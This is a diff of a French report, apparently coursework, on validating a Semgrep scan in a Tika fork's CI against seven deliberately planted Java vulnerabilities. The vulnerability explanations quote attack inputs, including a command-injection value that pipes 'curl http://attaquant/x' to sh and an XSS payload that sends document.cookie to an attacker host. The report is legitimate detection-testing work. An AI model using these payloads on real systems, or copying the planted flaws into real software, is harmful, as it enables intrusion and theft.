@@ -109,11 +109,13 @@ La première version utilisait toujours `git merge-base HEAD origin/main`. Lors 
 | A | Scan complet du code d'origine, sans `--error` | 11 alertes préexistantes, job vert | ✅ 11 alertes, 60 règles, 1 468 fichiers ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43746199713)) |
 | B | Scan différentiel sans nouvelle vulnérabilité | 0 nouvelle alerte, job vert | ✅ ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43807537450)) |
 | C | Ajout progressif de vulnérabilités (1re version) | le nombre d'alertes suit les ajouts, job rouge | ✅ 1 → 7 alertes ([run final](https://github.com/CarlosDanielZQ/tika/actions/runs/43940925801)) |
-| D | `semgrep-validation.yml` avec les 7 vulnérabilités finales (référence `origin/main`) | 7 nouvelles alertes, job rouge, code de sortie 1 | **À COMPLÉTER : lien du run** |
-| E | `main-jdk17-build.yml` lancé manuellement (`workflow_dispatch`) sur un commit qui ajoute une vulnérabilité | `Semgrep Security Scan` rouge, `build` **ignoré (skipped)** | **À COMPLÉTER : lien du run** |
-| F | `main-jdk17-build.yml` sur un commit qui modifie du Java sans vulnérabilité | `Semgrep` vert, `build` lancé | **À COMPLÉTER : lien du run** |
+| D | `semgrep-validation.yml` avec les 7 vulnérabilités finales (référence `origin/main`) | au moins une nouvelle alerte par vulnérabilité, job rouge, code de sortie 1 | ✅ 8 nouvelles alertes couvrant V1 à V7 (V7 est signalée par deux règles), code de sortie 1 ([run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624)) |
+| E | `main-jdk17-build.yml` sur une PR `tache3-semgrep` → `main` (fork) qui introduit les 7 vulnérabilités ([PR #1](https://github.com/CarlosDanielZQ/tika/pull/1), fermée sans fusion) | `Semgrep Security Scan` rouge, `build` et `e2e-tests` **ignorés (skipped)**, workflow rouge | ✅ 8 nouvelles alertes par rapport à `main`, code de sortie 1, `build` et `e2e-tests` *skipped*, workflow en échec après 42 s au lieu d'environ 60 min ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43992516267)) |
+| F | `main-jdk17-build.yml` sur une PR `tache3-validation-f` → `tache3-semgrep` qui modifie du Java **sans** ajouter de vulnérabilité : ajout de `executeSafeQuery`, la version corrigée de V3 avec `PreparedStatement` et un paramètre lié | `Semgrep Security Scan` vert (0 nouvelle alerte, malgré du code SQL très proche de V3), `build` lancé | **À COMPLÉTER : lien du run** |
 
 Les scénarios A à C ont été réalisés avec la première version du workflow. Les scénarios D à F valident la version finale.
+
+**Note sur `workflow_dispatch`.** Le déclencheur manuel ajouté au workflow n'est utilisable qu'une fois le fichier présent sur la branche par défaut (`main`) du dépôt : GitHub n'affiche le bouton « Run workflow » que dans ce cas. Les scénarios E et F passent donc par des pull requests. C'est d'ailleurs l'usage visé : bloquer une PR qui introduit une vulnérabilité.
 
 ---
 
@@ -123,17 +125,22 @@ Les scénarios A à C ont été réalisés avec la première version du workflow
 
 Chaque vulnérabilité appartient à une **catégorie CWE différente** et déclenche une **règle Semgrep différente** :
 
-| # | Type de vulnérabilité | CWE | Fichier | Règle Semgrep (`p/java`) | Sévérité |
+| # | Type de vulnérabilité | CWE | Fichier:ligne | Règle(s) Semgrep (`p/java`) | Sévérité |
 |---|---|---|---|---|---|
-| V1 | Transmission en clair | CWE-319 | `SemgrepSecurityDemo.java` | `unencrypted-socket` | WARNING |
-| V2 | Chiffrement trop faible (DES) | CWE-326 | `SemgrepSecurityDemo.java` | `des-is-deprecated` | WARNING |
-| V3 | Injection SQL | CWE-89 | `SemgrepSecurityDemo.java` | `formatted-sql-string` | ERROR |
-| V4 | XML External Entity (XXE) | CWE-611 | `SemgrepSecurityDemo.java` | `documentbuilderfactory-disallow-doctype-decl-missing` | ERROR |
-| V5 | Path traversal | CWE-22 | `SemgrepVulnerableResource.java` | `jax-rs-path-traversal` | WARNING |
-| V6 | Injection de commande système | CWE-78 | `SemgrepVulnerableResource.java` | `tainted-cmd-from-http-request` | ERROR |
-| V7 | Cross-site scripting (XSS) réfléchi | CWE-79 | `SemgrepVulnerableResource.java` | `servletresponse-writer-xss` | ERROR |
+| V1 | Transmission en clair | CWE-319 | `SemgrepSecurityDemo.java:46` | `unencrypted-socket` | WARNING |
+| V2 | Chiffrement trop faible (DES) | CWE-326 | `SemgrepSecurityDemo.java:54` | `des-is-deprecated` | WARNING |
+| V3 | Injection SQL | CWE-89 | `SemgrepSecurityDemo.java:62` | `formatted-sql-string` | ERROR |
+| V4 | XML External Entity (XXE) | CWE-611 | `SemgrepSecurityDemo.java:72` | `documentbuilderfactory-disallow-doctype-decl-missing` | ERROR |
+| V5 | Path traversal | CWE-22 | `SemgrepVulnerableResource.java:53` | `jax-rs-path-traversal` | WARNING |
+| V6 | Injection de commande système | CWE-78 | `SemgrepVulnerableResource.java:72` | `tainted-cmd-from-http-request` | ERROR |
+| V7 | Cross-site scripting (XSS) réfléchi | CWE-79 | `SemgrepVulnerableResource.java:88` | `servletresponse-writer-xss` + `no-direct-response-writer` | ERROR + WARNING |
 
-Les CWE et les sévérités sont celles déclarées par chaque règle du registre Semgrep. **À COMPLÉTER : confirmer avec le Job Summary du run D.**
+Les 7 vulnérabilités sont toutes détectées : c'est le Job Summary du [run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624). Les CWE et les sévérités sont celles déclarées par les règles. Semgrep produit **8 alertes pour 7 vulnérabilités** parce que V7 déclenche deux règles indépendantes de `p/java` :
+
+- `servletresponse-writer-xss` suit la donnée de `request.getParameter` jusqu'à `getWriter().write`.
+- `no-direct-response-writer` signale toute écriture directe dans la réponse HTTP, sans moteur de gabarits qui encoderait la sortie.
+
+Les deux décrivent la même faille (CWE-79), à la même ligne.
 
 **Pourquoi avoir remplacé la première version ?** La première version comptait bien 7 alertes, mais 5 d'entre elles (MD5, SHA-1, DES, RC4, Blowfish) relèvent de la même famille : algorithme cryptographique faible (CWE-326/327/328). L'énoncé exige 7 vulnérabilités **de types différents**. Nous avons donc gardé un seul représentant de la crypto faible (DES) et ajouté XXE, path traversal, injection de commande et XSS. Ce sont des mécanismes d'attaque différents, avec des conséquences différentes (lecture de fichiers, exécution de code, vol de session…).
 
@@ -151,7 +158,7 @@ Socket socket = new Socket();
 
 **Pourquoi c'est vulnérable.** Une `java.net.Socket` transporte les octets tels quels, sans chiffrement ni authentification du serveur. Toute personne sur le chemin réseau (Wi-Fi public, routeur compromis) peut lire ou modifier les données : documents envoyés à Tika, métadonnées, identifiants.
 **Correction.** Utiliser `SSLSocketFactory.getDefault().createSocket(...)` (TLS).
-**Résultat Semgrep.** Règle `java.lang.security.audit.crypto.unencrypted-socket.unencrypted-socket` — **À COMPLÉTER : ligne et sévérité du run D.**
+**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.crypto.unencrypted-socket.unencrypted-socket`, WARNING, ligne 46.
 
 ### 2.4. V2 — Chiffrement trop faible : DES (CWE-326)
 
@@ -161,7 +168,7 @@ return Cipher.getInstance("DES/ECB/PKCS5Padding");
 
 **Pourquoi c'est vulnérable.** DES n'a qu'une clé effective de 56 bits, cassable en quelques heures par force brute sur du matériel dédié. Le mode ECB chiffre deux blocs identiques de la même façon, ce qui laisse voir la structure des données.
 **Correction.** `Cipher.getInstance("AES/GCM/NoPadding")` avec une clé de 256 bits et un nonce unique.
-**Résultat Semgrep.** Règle `java.lang.security.audit.crypto.des-is-deprecated.des-is-deprecated` — **À COMPLÉTER.**
+**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.crypto.des-is-deprecated.des-is-deprecated`, WARNING, ligne 54.
 
 ### 2.5. V3 — Injection SQL (CWE-89)
 
@@ -172,7 +179,7 @@ return statement.executeQuery(query);
 
 **Pourquoi c'est vulnérable.** L'entrée est concaténée dans la requête. Avec `userInput = "' OR '1'='1"`, la clause devient toujours vraie et toute la table est renvoyée. D'autres charges permettent de modifier ou de supprimer des données.
 **Correction.** `PreparedStatement` avec un paramètre lié (`WHERE name = ?`).
-**Résultat Semgrep.** Règle `java.lang.security.audit.formatted-sql-string.formatted-sql-string` — **À COMPLÉTER.**
+**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.formatted-sql-string.formatted-sql-string`, ERROR, ligne 62.
 
 ### 2.6. V4 — XML External Entity, XXE (CWE-611)
 
@@ -184,7 +191,7 @@ return builder.parse(xml);
 
 **Pourquoi c'est vulnérable.** Avec sa configuration par défaut, la fabrique accepte les `DOCTYPE` et les entités externes. Un document piégé contenant `<!ENTITY x SYSTEM "file:///etc/passwd">` fait lire un fichier local par le parseur. On peut aussi forcer des requêtes réseau internes (SSRF), ou épuiser la mémoire (« billion laughs »). Pour Tika, dont le métier est de lire des documents non fiables, c'est l'une des vulnérabilités les plus graves.
 **Correction.** `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, ou simplement `XMLReaderUtils` de Tika.
-**Résultat Semgrep.** Règle `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing` (analyse de flux : la fabrique atteint `newDocumentBuilder()` sans avoir été sécurisée) — **À COMPLÉTER.**
+**Résultat Semgrep.** Règle `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing` (analyse de flux : la fabrique atteint `newDocumentBuilder()` sans avoir été sécurisée). ✅ ERROR, ligne 72.
 
 ### 2.7. V5 — Path traversal (CWE-22)
 
@@ -199,7 +206,7 @@ public String readDocument(@PathParam("name") String name) throws IOException {
 
 **Pourquoi c'est vulnérable.** Le segment d'URL est utilisé tel quel comme nom de fichier. `GET /semgrep-demo/document/..%2F..%2F..%2Fetc%2Fpasswd` remonte hors de `/var/tika/documents/` et renvoie n'importe quel fichier lisible par le serveur (configuration, clés…).
 **Correction.** Normaliser le chemin et vérifier qu'il reste dans le répertoire : `base.resolve(name).normalize().startsWith(base)`, ou n'accepter que `FilenameUtils.getName(name)`.
-**Résultat Semgrep.** Règle `java.jax-rs.security.jax-rs-path-traversal.jax-rs-path-traversal` — **À COMPLÉTER.**
+**Résultat Semgrep.** ✅ Règle `java.jax-rs.security.jax-rs-path-traversal.jax-rs-path-traversal`, WARNING, ligne 53 (la méthode qui reçoit le `@PathParam`).
 
 ### 2.8. V6 — Injection de commande système (CWE-78)
 
@@ -214,7 +221,7 @@ Process process = new ProcessBuilder(command).start();
 
 **Pourquoi c'est vulnérable.** Le paramètre HTTP est concaténé dans une chaîne interprétée par `sh -c`. Avec `?file=x;curl http://attaquant/x|sh`, le shell exécute la seconde commande : exécution de code arbitraire sur le serveur, c'est-à-dire une compromission complète.
 **Correction.** Ne pas passer par un shell : `new ProcessBuilder("file", "--mime-type", "--", file)`, après avoir validé `file` sur une liste blanche. Ici, la détection de type MIME de Tika (`Tika.detect`) suffit de toute façon.
-**Résultat Semgrep.** Règle `java.lang.security.audit.tainted-cmd-from-http-request.tainted-cmd-from-http-request`. C'est une règle de *taint* : la donnée part de `HttpServletRequest` (source) et atteint la liste d'arguments du processus (puits). **À COMPLÉTER.**
+**Résultat Semgrep.** Règle `java.lang.security.audit.tainted-cmd-from-http-request.tainted-cmd-from-http-request`. C'est une règle de *taint* : la donnée part de `HttpServletRequest` (source) et atteint la liste d'arguments du processus (puits). ✅ ERROR, ligne 72 (`command.add("file --mime-type " + file)`).
 
 ### 2.9. V7 — Cross-site scripting réfléchi (CWE-79)
 
@@ -226,7 +233,12 @@ response.getWriter().write(name);
 
 **Pourquoi c'est vulnérable.** Le paramètre est renvoyé dans une page HTML sans encodage. Un lien `?name=<script>fetch('//attaquant?c='+document.cookie)</script>` envoyé à une victime exécute ce JavaScript dans son navigateur, dans le contexte du serveur Tika : vol de session, actions en son nom.
 **Correction.** Encoder la sortie (`Encode.forHtml(name)` d'OWASP Encoder) ou répondre en `text/plain`.
-**Résultat Semgrep.** Règle `java.lang.security.servletresponse-writer-xss.servletresponse-writer-xss` — **À COMPLÉTER.**
+**Résultat Semgrep.** ✅ Deux règles à la ligne 88 :
+
+- `java.lang.security.servletresponse-writer-xss.servletresponse-writer-xss` (ERROR) ;
+- `java.lang.security.audit.xss.no-direct-response-writer.no-direct-response-writer` (WARNING).
+
+Voir 2.1.
 
 ### 2.10. Essais non détectés par `p/java` (et pourquoi)
 
@@ -259,18 +271,51 @@ La première version comparait un scan complet (11 alertes sur 1 468 fichiers) �
 
 ### 3.2. Résultats
 
-**À COMPLÉTER : copier ici le tableau produit par le job `full-report` (Job Summary du run D).** Résultat attendu :
+Résultats du job `full-report` ([run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624), Semgrep 1.185.0, `p/java`) :
 
-| | Avant (code d'origine) | Après (7 vulnérabilités) |
+| | Avant (`a2d75c2c1`, Tika d'origine) | Après (`18fcd62ad`, 7 vulnérabilités) |
 |---|---|---|
-| Règles exécutées | 60 | 60 |
-| Alertes | 11 | 18 |
-| Nouvelles alertes | — | **7** (V1 à V7) |
+| Fichiers analysés | 1 468 | 1 470 (+2 : nos deux classes) |
+| Alertes | 11 | 19 |
+| Nouvelles alertes | — | **8** |
 | Alertes disparues | — | 0 |
+
+Alertes nouvellement introduites :
+
+| # | Règle | Sévérité | CWE | Emplacement | Vulnérabilité |
+|---|---|---|---|---|---|
+| 1 | `unencrypted-socket` | WARNING | CWE-319 | `SemgrepSecurityDemo.java:46` | V1 |
+| 2 | `des-is-deprecated` | WARNING | CWE-326 | `SemgrepSecurityDemo.java:54` | V2 |
+| 3 | `formatted-sql-string` | ERROR | CWE-89 | `SemgrepSecurityDemo.java:62` | V3 |
+| 4 | `documentbuilderfactory-disallow-doctype-decl-missing` | ERROR | CWE-611 | `SemgrepSecurityDemo.java:72` | V4 |
+| 5 | `jax-rs-path-traversal` | WARNING | CWE-22 | `SemgrepVulnerableResource.java:53` | V5 |
+| 6 | `tainted-cmd-from-http-request` | ERROR | CWE-78 | `SemgrepVulnerableResource.java:72` | V6 |
+| 7 | `no-direct-response-writer` | WARNING | CWE-79 | `SemgrepVulnerableResource.java:88` | V7 |
+| 8 | `servletresponse-writer-xss` | ERROR | CWE-79 | `SemgrepVulnerableResource.java:88` | V7 |
+
+Nombre d'alertes par règle :
+
+| Règle | Avant | Après | Différence |
+|---|---|---|---|
+| `unencrypted-socket` | 4 | 5 | +1 |
+| `des-is-deprecated` | 0 | 1 | +1 |
+| `formatted-sql-string` | 2 | 3 | +1 |
+| `documentbuilderfactory-disallow-doctype-decl-missing` | 1 | 2 | +1 |
+| `jax-rs-path-traversal` | 0 | 1 | +1 |
+| `tainted-cmd-from-http-request` | 0 | 1 | +1 |
+| `servletresponse-writer-xss` | 0 | 1 | +1 |
+| `no-direct-response-writer` | 0 | 1 | +1 |
+| `saxparserfactory-disallow-doctype-decl-missing` | 1 | 1 | 0 |
+| `xmlinputfactory-possible-xxe` | 1 | 1 | 0 |
+| `use-of-aes-ecb` | 1 | 1 | 0 |
+| `use-of-sha1` | 1 | 1 | 0 |
 
 ### 3.3. Interprétation
 
-Les 11 alertes d'origine restent identiques avant et après. Ce sont des faiblesses historiques de Tika, hors du périmètre de la tâche, et c'est exactement ce que l'analyse différentielle ignore. Les 7 nouvelles alertes correspondent une à une aux vulnérabilités V1 à V7 : 7 règles distinctes dans 2 fichiers. Le scan différentiel du CI (run D) rapporte ces mêmes 7 alertes, ce qui confirme que le contrôle bloque exactement ce qui a été introduit.
+- **Aucune alerte d'origine n'a disparu ou changé** (0 alerte disparue). Les 11 alertes de Tika (sockets, SQL, XXE, AES-ECB, SHA-1) sont des faiblesses historiques hors du périmètre de la tâche, et c'est exactement ce que l'analyse différentielle ignore.
+- **Les 8 nouvelles alertes couvrent les 7 vulnérabilités**, une ou deux par vulnérabilité, toutes dans nos 2 fichiers. Aucune alerte n'apparaît ailleurs dans Tika.
+- Pour 4 règles, Tika avait déjà des alertes (par exemple `unencrypted-socket` : 4 → 5). Comparer seulement les noms de règles ou les totaux ne suffit donc pas pour savoir ce qui est nouveau. C'est la comparaison alerte par alerte qui identifie précisément les 8 nouvelles.
+- Le scan différentiel du CI (job `Semgrep (nouvelles vulnerabilites)` du même run) rapporte **les mêmes 8 alertes** que la comparaison complète. Le contrôle du build bloque donc exactement ce qui a été introduit, ni plus ni moins.
 
 ---
 
@@ -311,8 +356,8 @@ Faire échouer le vrai build de Tika pour tester l'action aurait coûté environ
 
 | Job | Variable | Résultat attendu | Résultat obtenu |
 |---|---|---|---|
-| `test-fails` | `TIKA_RICKROLL_DEMO=true` | job rouge, rickroll (bannière, annotation, Job Summary) | **À COMPLÉTER : lien du run + capture** |
-| `test-passes` | absente | test ignoré, job vert, aucun rickroll | **À COMPLÉTER : lien du run** |
+| `test-fails` | `TIKA_RICKROLL_DEMO=true` | job rouge, rickroll (bannière, annotation, Job Summary) | ✅ job rouge, étape rickroll exécutée : annotation « Rickroll (1 test(s) en echec) » et Job Summary avec la vidéo et le test `RickrollDemoTest#testNeverGonnaGiveYouUp` ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |
+| `test-passes` | absente | test ignoré, job vert, aucun rickroll | ✅ job vert, étape rickroll ignorée (*skipped*) (même [run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |
 
 Le script a aussi été testé localement avec un faux rapport JUnit contenant un test en échec (rickroll déclenché, sorties `failed-tests=1`, `rickrolled=true`) et sans rapport (notice, pas de rickroll).
 
